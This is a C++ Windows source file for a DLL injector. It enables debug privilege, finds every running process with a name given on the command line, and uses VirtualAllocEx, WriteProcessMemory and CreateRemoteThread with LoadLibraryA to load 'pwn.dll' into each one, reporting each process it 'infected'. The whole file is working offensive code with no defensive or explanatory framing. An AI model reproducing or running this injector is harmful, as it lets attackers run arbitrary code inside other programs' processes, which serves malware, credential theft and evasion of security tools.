#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <fstream>
#include <vector>
#include <iostream>
#include <tlhelp32.h>
using namespace std;
int InjectDllDansProcessus(long pidProcAInjecter , char* fullPathDll);
void infect(string process, char* fullDllPath);
bool loadConf();

int main(int argc , char* argv[])
{
	//elevator
	TOKEN_PRIVILEGES priv;
	HANDLE n1;
	LUID luid;
	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &n1)) return false;;
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	priv.PrivilegeCount=1;
	priv.Privileges[0].Luid=luid;
	priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if(!AdjustTokenPrivileges(n1, FALSE, &priv, sizeof(priv), NULL, NULL))  return false;
	CloseHandle(n1);

	
	char* currentPath=new char[1024];
	GetCurrentDirectoryA(1024, currentPath);
	string temp=string(currentPath)+"\\pwn.dll";
	delete currentPath;
	char* fullDllPath=(char*)temp.c_str();

	
	if(argc<2) exit(0);
	printf("[-] Inject ./pwn.dll into %s...\n", argv[1]);
	infect(argv[1], fullDllPath);
	printf("[-] END\n");
	system("pause");
    return 0;
}



int InjectDllDansProcessus(long pidProcAInjecter , char* fullPathDll)
{
    long tailleStringDll = strlen(fullPathDll) + 1;

    HANDLE handleProcess = OpenProcess(PROCESS_ALL_ACCESS , FALSE , pidProcAInjecter);
    if(handleProcess == NULL)return 0;

    LPVOID addrEspaceReserve = VirtualAllocEx( handleProcess , NULL , tailleStringDll , MEM_COMMIT , PAGE_EXECUTE_READWRITE);
    if(addrEspaceReserve == NULL)
        return 0;

    int retourFonctionWrite = WriteProcessMemory( handleProcess , addrEspaceReserve , fullPathDll , tailleStringDll , 0);
    if(retourFonctionWrite == 0)
        return 0;

    DWORD identificateurThread ;
    LPTHREAD_START_ROUTINE addrLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(LoadLibrary("kernel32"),"LoadLibraryA");
    HANDLE retourFonctionCreate = CreateRemoteThread( handleProcess , NULL , 0 , addrLoadLibrary , addrEspaceReserve , 0 , &identificateurThread );
    if(retourFonctionCreate == NULL)
        return 0;

    WaitForSingleObject(retourFonctionCreate,INFINITE);
    VirtualFreeEx( handleProcess , addrEspaceReserve , 0 , MEM_DECOMMIT);

    CloseHandle(handleProcess);
    CloseHandle(retourFonctionCreate);

    return 1;
}

void infect(string process, char* fullDllPath)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    PROCESSENTRY32 structprocsnapshot = {0};
	bool cpt=0;

    structprocsnapshot.dwSize = sizeof(PROCESSENTRY32);

    if(snapshot == INVALID_HANDLE_VALUE)return ;
    if(Process32First(snapshot,&structprocsnapshot) == FALSE)return ;

    while(Process32Next(snapshot,&structprocsnapshot) )
    {
		if(!strcmp(structprocsnapshot.szExeFile,process.c_str()))
       {
            if(InjectDllDansProcessus(structprocsnapshot.th32ProcessID,fullDllPath)==1)
			{
				cpt++;
				printf("[-] Injected into %d process.\n", structprocsnapshot.th32ProcessID);
			}
       }
    }
    CloseHandle(snapshot);
	if(cpt==0) printf("[-] No process found.\n");
}
